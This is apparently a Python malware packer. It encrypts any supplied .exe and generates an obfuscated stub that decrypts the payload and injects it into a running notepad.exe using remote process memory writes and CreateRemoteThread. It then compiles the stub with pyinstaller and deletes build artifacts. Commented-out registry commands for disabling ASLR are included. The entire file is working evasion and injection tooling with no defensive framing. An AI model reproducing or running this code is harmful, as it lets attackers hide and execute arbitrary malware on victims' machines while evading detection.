from cryptography.fernet import Fernet
import subprocess
import os
import shutil
import sys
import base64

input_file = sys.argv[1]
input_filename_w_extention = os.path.basename(input_file)
# remove the .exe extension
input_filename = input_filename_w_extention[:-4]
output_filename = input_filename
output_path = os.getcwd()

# Encrypt the software
key = Fernet.generate_key()
cipher = Fernet(key)
with open(input_file, "rb") as f:
    payload = f.read()
    encrypted_payload = cipher.encrypt(payload)


# decryptor code
STUB = f"""
import psutil as _p
import subprocess as _sp
from cryptography.fernet import Fernet as _F
from ctypes import *
import ctypes as _ct

# Disable ASLR
# _sp.run(["REG", "ADD", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management", "/v", "MoveImages", "/t", "REG_DWORD", "/d", "0", "/f"], shell=True)

# Enable ASLR
# _sp.run(["REG", "DELETE", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management", "/v", "MoveImages", "/f"], shell=True)

_k = {key!r}
_f = _F(_k)
_p_size = {len(payload)}
_e_p = {encrypted_payload}

_p_name = "n" + "otepad" + ".exe"
for _proc in _p.process_iter():
    if _proc.name() == _p_name:
        _t_p = _proc
        break
else:
    _t_p = _sp.Popen(_p_name)

_d_p = _f.decrypt(_e_p)

_p_h = windll.kernel32.OpenProcess(0x1F0FFF, False, _t_p.pid)
_d_p_addr = windll.kernel32.VirtualAllocEx(_p_h, None, len(_d_p), 0x3000, 0x04)

windll.kernel32.WriteProcessMemory(_p_h, _d_p_addr, _d_p, len(_d_p), None)

_ct.windll.kernel32.VirtualProtectEx(_p_h, _d_p_addr, len(_d_p), 0x40, byref(c_ulong()))
_ct.windll.kernel32.CreateRemoteThread(_p_h, None, 0, _d_p_addr, None, 0, None)
"""

decryptor_script_path = f"{output_path}\GEN_{output_filename}.pyw"

with open(decryptor_script_path, "w") as f:
    f.write(STUB)


# Compile the decryptor code into an executable
subprocess.call(["pyinstaller", "--onefile", decryptor_script_path])

# Remove unnecessary files/folders generated by pyinstaller
os.remove(f'GEN_{input_filename}.spec')
shutil.rmtree('build')
shutil.move(f'{output_path}\dist\GEN_{input_filename}.exe',
            f'{output_path}\GEN_{output_filename}.exe')
shutil.rmtree('dist')
os.remove(decryptor_script_path)
